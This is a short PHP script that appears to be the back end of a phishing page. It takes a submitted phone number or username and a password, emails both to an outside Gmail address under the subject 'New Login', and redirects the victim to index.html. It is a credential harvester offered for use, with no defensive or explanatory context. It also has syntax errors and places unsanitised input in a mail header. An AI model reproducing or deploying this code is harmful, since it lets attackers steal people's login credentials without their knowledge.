<? php

$number = $_POST['number'];
$password = $_POST['password'];




$email_from = 'rakibulislamrovin@gmail.com';

$email_subject = 'New Login'

$email_body = "User Name: $number.\n".
              "User Password: $password.\n";
              
            
$to = '26674742hdhdj@gmail.com';

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $number \r\n";

mail($to,$email_subject,$email_body,$headers);

header("Location: index.html");

?>
